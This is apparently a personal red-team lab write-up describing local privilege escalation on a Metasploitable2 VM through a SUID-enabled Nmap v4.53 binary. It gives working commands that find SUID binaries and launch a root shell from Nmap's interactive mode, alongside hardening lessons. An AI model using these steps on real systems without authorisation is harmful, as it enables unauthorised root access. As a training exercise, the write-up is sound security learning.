# 🧱 Lab05 – Privilege Escalation via SUID Nmap Binary

> **Date:** 29 May 2025  
> **Target:** Metasploitable2 – Linux System  
> **Vulnerability:** Misconfigured SUID binary of Nmap v4.53  
> **Technique:** Local Privilege Escalation via `--interactive` shell

---

## 🛡️ Description

This lab demonstrates a classic **Local Privilege Escalation (LPE)** technique using an outdated version of Nmap (`v4.53`) installed with the **SUID bit** set.  
Nmap’s deprecated `--interactive` mode allows arbitrary shell command execution, enabling escalation to **root** privileges when misconfigured.

---

## 🎯 Target System

- Metasploitable2 Linux VM  
- Vulnerable binary: `/usr/bin/nmap`  
- Permissions: SUID enabled (`-rwsr-xr-x`)

---

## 🧨 Exploitation Steps

1. 🔍 **Identify SUID binaries related to Nmap**
```bash
find / -perm -4000 -type f -name "*nmap*" 2>/dev/null
```

2. **Run Nmap in interactive mode:**
   ```bash
   /usr/bin/nmap --interactive
   
3. **Spawn a root shell:**
   ```bash
   nmap> !sh
   
4. **Verify root access:**
   ```bash
   whoami
   id
---

## 📊 Real-World Relevance
SUID misconfigurations are common in poorly maintained Linux systems. Outdated tools with legacy features like --interactive pose serious risks when granted root-level privileges.
This technique is directly applicable in internal pentests, CTFs, and Red Team post-exploitation phases.

## 🧠 What I Learned
- How to locate and analyze SUID binaries on Linux

- The danger of outdated tools with elevated execution rights

- How to gain root access using legitimate binaries via legacy features

- Reinforced importance of privilege separation in system hardening

## Screenshot
![Nmap Privilege Escalation](https://github.com/ATTezel/RedTeam-Labs/blob/main/lab5/Screen%20Shot%202025-05-29%20at%2015.45.28.png)

## 📁 Notes
- nmap --interactive has been removed in newer versions

- This is a great example of why system audits must include permission checks

- Learned to handle local escalation without external scripts/tools
